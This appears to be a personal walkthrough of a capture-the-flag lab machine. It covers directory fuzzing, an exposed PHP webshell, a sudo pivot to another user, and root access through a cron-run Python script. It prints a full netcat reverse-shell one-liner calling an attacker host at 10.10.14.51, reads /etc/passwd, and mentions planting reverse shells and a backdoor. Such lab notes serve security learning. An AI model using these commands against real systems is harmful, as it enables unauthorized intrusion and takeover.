Main steps:
1. Fuzz directories to find a php shell program
2. Enumerate sudo usage
3. Pivot to another user using sudo
4. Enumerate a python script and find that it runs every minute
5. Edit the script to spawn a root shell to gain root access

Learning points
1. use the raft-medium-words.txt fuzzing list for web discovery
2. check your stupid VPN IP
3. msfvenom is iffy

Enumeration
![[Pasted image 20260227221416.png]]
Open port 80 - navigated to site
Site talks about using this server to develop a php reverse shell - attempt to navigate to the folder containing this php file and launch a shell?
Ran feroxbuster using big.txt wordlist - interesting locations:
	http://10.129.239.85/dev/phpbash.min.php
	http://10.129.239.85/dev/phpbash.php
	http://10.129.239.85/php/
	http://10.129.239.85/php/sendMail.php
	http://10.129.239.85/uploads/

Since the phpbash.php file is the reverse shell talked about on the website, navigated to this and was able to access a webshell as www-data
![[Pasted image 20260227224209.png]]
cat /etc/passwd shows two regular users 'arrexel' and 'scriptmanager'
![[Pasted image 20260227224454.png]]
Uploaded a php reverse shell to the uploads folder to spawn a reverse shell as the webshell is extremely laggy

spawned a nc reverse shell using 
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.51 5555 >/tmp/f
![[Pasted image 20260227230924.png]]

Initial enumeration shows that www-data can run commands as scriptmanager without needing a password, and that there's a folder scripts that is owned by scriptmanager

so this server kept dying over and over and i couldn't maintain a shell

![[Pasted image 20260227231737.png]]
pivoted to scriptmanager using sudo -u scriptmanager bash -i
in /scripts, (writable by scriptmanager) there is a test.py that writes to test.txt
based on test.txt timestamps, this script is executed every minute
script is also executed as root 

Priv esc by editing the test.py script (python backdoor)
![[Pasted image 20260228001310.png]]
spawned root shell